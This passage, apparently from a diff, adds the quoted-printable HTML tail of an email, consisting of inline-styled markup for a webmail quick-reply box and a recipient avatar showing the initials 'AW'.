+ntainer" style=3D"OVERFLOW: hidden; MARGIN-BOTTOM: 20px; HEIGHT: 1145px; BA=
+CKGROUND: rgb(255,255,255); PADDING-BOTTOM: 37px; PADDING-TOP: 20px; MIN-HE=
+IGHT: 62px; MARGIN-RIGHT: 263px" data-key=3D"view=3Dmessage-quick-reply&amp=
+;ids=3D175358910490738726&amp;qrIds=3D175358910490738726">
+<DIV class=3D"mail-QuickReply is-fixed" style=3D"WIDTH: 670px; BACKGROUND: =
+rgb(255,255,255); POSITION: fixed; PADDING-TOP: 10px; LEFT: 320px; Z-INDEX:=
+ 900; PADDING-RIGHT: 263px; BOTTOM: 0px; box-shadow: rgba(0, 0, 0, 0.1) 0px=
+ -1px 0px">
+<DIV class=3D"ns-view-quick-reply-box ns-view-id-391" data-key=3D"box=3Dqui=
+ck-reply-box">
+<DIV class=3D"ns-view-quick-reply-placeholder ns-view-id-392 mail-QuickRepl=
+y-Placeholder" style=3D"CURSOR: text; MIN-HEIGHT: 52px; transition: backgro=
+und 0.15s ease-out 0s" data-key=3D"view=3Dquick-reply-placeholder&amp;ids=
+=3D175358910490738726&amp;qrIds=3D175358910490738726">
+<SPAN class=3D"mail-User-Avatar mail-User-Avatar_size_42 mail-QuickReply-Pi=
+cture" style=3D'FONT-SIZE: 18px; CURSOR: default; HEIGHT: 42px; FONT-FAMILY=
+: "YS Text", Helvetica, Arial, sans-serif; WIDTH: 42px; WHITE-SPACE: normal=
+; WORD-SPACING: 0px; MIN-WIDTH: 42px; TEXT-TRANSFORM: none; FLOAT: left; FO=
+NT-WEIGHT: 700; COLOR: rgb(255,255,255); FONT-STYLE: normal; TEXT-ALIGN: ce=
+nter; MARGIN-LEFT: 20px; ORPHANS: 2; WIDOWS: 2; DISPLAY: block; LETTER-SPAC=
+ING: normal; LINE-HEIGHT: 44px; TEXT-INDENT: 0px;=20
+box-shadow: rgba(0, 0, 0, 0.1) 0px 0px 0px 1px inset; font-stretch: normal;=
+ border-radius: 50%; user-select: none; -webkit-font-smoothing: antialiased=
+; text-rendering: optimizelegibility; font-variant-ligatures: normal; font-=
+variant-caps: normal; -webkit-text-stroke-width: 0px; text-decoration-thick=
+ness: initial; text-decoration-style: initial; text-decoration-color: initi=
+al' data-id=3D"recipient-57">AW</SPAN></DIV></DIV></DIV></DIV></BODY></HTML=
+>
+
